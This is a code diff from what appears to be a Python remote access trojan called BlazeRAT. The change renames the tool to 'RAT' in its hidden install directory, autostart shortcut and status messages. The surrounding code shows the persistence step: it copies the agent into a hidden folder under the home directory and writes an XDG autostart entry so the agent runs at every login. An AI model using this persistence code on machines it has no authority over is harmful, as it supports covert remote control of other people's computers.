@@ -11,11 +11,11 @@ from os import path, chdir, mkdir, remove
 
 # Installation path settings
 HOME_DIRECTORY = path.expanduser('~')
-INSTALL_DIRECTORY = path.join(HOME_DIRECTORY, ".BlazeRAT")
+INSTALL_DIRECTORY = path.join(HOME_DIRECTORY, ".RAT")
 CURRENT_DIRECTORY = path.dirname(path.realpath(argv[0]))
 # Autorun path settings
 AUTORUN_DIRECTORY = path.join(HOME_DIRECTORY, ".config/autostart")
-AUTORUN_SHORTCUT = path.join(AUTORUN_DIRECTORY, "BlazeRAT.desktop")
+AUTORUN_SHORTCUT = path.join(AUTORUN_DIRECTORY, "RAT.desktop")
 
 # Go to current working directory
 chdir(CURRENT_DIRECTORY)
@@ -37,7 +37,7 @@ def ServiceInstall() -> str:
     # Payload
     shortcut = (f"""
         [Desktop Entry]
-        Name=BlazeRAT
+        Name=RAT
         Comment=Remote Administration Tool
         Exec=/usr/bin/python3 {path.join(INSTALL_DIRECTORY, "main.py")}
         Type=Application
@@ -53,7 +53,7 @@ def ServiceInstall() -> str:
         with open(AUTORUN_SHORTCUT, "w") as file:
             file.write(shortcut)
     # Done
-    return "[+] BlazeRAT agent is installed"
+    return "[+] RAT agent is installed"
 
 """ Uninstall service """
 def ServiceUninstall() -> str:
@@ -65,4 +65,4 @@ def ServiceUninstall() -> str:
     if path.exists(INSTALL_DIRECTORY):
         rmtree(INSTALL_DIRECTORY)
     # Done
-    return "[+] BlazeRAT agent uninstalled"
+    return "[+] RAT agent uninstalled"
